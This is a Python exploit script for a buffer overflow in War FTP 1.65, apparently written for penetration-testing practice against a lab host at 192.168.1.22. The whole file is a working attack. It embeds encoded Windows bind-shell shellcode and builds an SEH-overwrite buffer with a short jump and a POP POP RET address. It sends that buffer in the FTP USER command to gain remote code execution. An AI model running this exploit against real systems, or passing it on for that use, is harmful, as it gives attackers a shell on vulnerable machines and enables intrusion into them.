#!/usr/bin/python

#
# Exploit for War FTP 1.65 vulnerability
# Written by Jean Gonzalez
# https://github.com/Jean13
#
# Cheers to Georgia Weidman
#
# Tested on Windows XP SP3 (En)
#
#
# 08/05/2016

import socket

# Encoder: x86/shikata_ga_nai
# Payload size: 355 bytes
# Payload: windows/shell_bind_tcp
shellcode = ("\xbb\xc4\xd7\xb1\xbb\xdd\xc4\xd9\x74\x24\xf4\x5a\x2b\xc9" +
"\xb1\x53\x31\x5a\x12\x83\xc2\x04\x03\x9e\xd9\x53\x4e\xe2" +
"\x0e\x11\xb1\x1a\xcf\x76\x3b\xff\xfe\xb6\x5f\x74\x50\x07" +
"\x2b\xd8\x5d\xec\x79\xc8\xd6\x80\x55\xff\x5f\x2e\x80\xce" +
"\x60\x03\xf0\x51\xe3\x5e\x25\xb1\xda\x90\x38\xb0\x1b\xcc" +
"\xb1\xe0\xf4\x9a\x64\x14\x70\xd6\xb4\x9f\xca\xf6\xbc\x7c" +
"\x9a\xf9\xed\xd3\x90\xa3\x2d\xd2\x75\xd8\x67\xcc\x9a\xe5" +
"\x3e\x67\x68\x91\xc0\xa1\xa0\x5a\x6e\x8c\x0c\xa9\x6e\xc9" +
"\xab\x52\x05\x23\xc8\xef\x1e\xf0\xb2\x2b\xaa\xe2\x15\xbf" +
"\x0c\xce\xa4\x6c\xca\x85\xab\xd9\x98\xc1\xaf\xdc\x4d\x7a" +
"\xcb\x55\x70\xac\x5d\x2d\x57\x68\x05\xf5\xf6\x29\xe3\x58" +
"\x06\x29\x4c\x04\xa2\x22\x61\x51\xdf\x69\xee\x96\xd2\x91" +
"\xee\xb0\x65\xe2\xdc\x1f\xde\x6c\x6d\xd7\xf8\x6b\x92\xc2" +
"\xbd\xe3\x6d\xed\xbd\x2a\xaa\xb9\xed\x44\x1b\xc2\x65\x94" +
"\xa4\x17\x13\x9c\x03\xc8\x06\x61\xf3\xb8\x86\xc9\x9c\xd2" +
"\x08\x36\xbc\xdc\xc2\x5f\x55\x21\xed\x4e\xfa\xac\x0b\x1a" +
"\x12\xf9\x84\xb2\xd0\xde\x1c\x25\x2a\x35\x35\xc1\x63\x5f" +
"\x82\xee\x73\x75\xa4\x78\xf8\x9a\x70\x99\xff\xb6\xd0\xce" +
"\x68\x4c\xb1\xbd\x09\x51\x98\x55\xa9\xc0\x47\xa5\xa4\xf8" +
"\xdf\xf2\xe1\xcf\x29\x96\x1f\x69\x80\x84\xdd\xef\xeb\x0c" +
"\x3a\xcc\xf2\x8d\xcf\x68\xd1\x9d\x09\x70\x5d\xc9\xc5\x27" +
"\x0b\xa7\xa3\x91\xfd\x11\x7a\x4d\x54\xf5\xfb\xbd\x67\x83" +
"\x03\xe8\x11\x6b\xb5\x45\x64\x94\x7a\x02\x60\xed\x66\xb2" +
"\x8f\x24\x23\xc2\xc5\x64\x02\x4b\x80\xfd\x16\x16\x33\x28" +
"\x54\x2f\xb0\xd8\x25\xd4\xa8\xa9\x20\x90\x6e\x42\x59\x89" +
"\x1a\x64\xce\xaa\x0e")
 
# Short jump assembly instruction to move EIP a short distance.
# POP POP RET address in little-endian format.
# Executing shellcode.
buffer = "A" * 569 + "\xEB\x06"  + "B" * 2 + "\xCA\x80\x45\x5F" + shellcode + "B" * 205

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(('192.168.1.22',21))
response = s.recv(1024)

print(response)

s.send('USER ' + buffer + '\r\n')
response = s.recv(1024)

print(response)

s.close()

